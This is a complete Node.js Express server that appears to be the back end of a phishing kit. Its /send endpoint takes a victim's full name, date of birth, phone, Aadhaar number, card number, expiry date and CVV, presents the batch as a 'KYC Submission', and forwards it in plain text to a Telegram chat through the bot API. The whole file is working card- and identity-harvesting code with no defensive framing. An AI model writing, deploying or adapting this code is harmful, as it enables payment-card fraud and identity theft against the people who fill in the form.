const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
    process.exit(1);
}

app.use(cors());
app.use(express.json());

app.post('/send', async (req, res) => {
    const { name, dob, phone, aadhaar, cardNumber, expiryDate, cvv } = req.body;

    if (!name || !dob || !phone || !aadhaar || !cardNumber || !expiryDate || !cvv) {
        return res.status(400).json({ message: 'All fields are required' });
    }

    const message = `New KYC Submission:\nFull Name: ${name}\nDOB: ${dob}\nPhone: ${phone}\nAadhaar: ${aadhaar}\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
        });
        res.json({ message: 'KYC data sent successfully!' });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({ message: 'Error sending data to Telegram' });
    }
});

const server = app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Process terminated');
    });
});
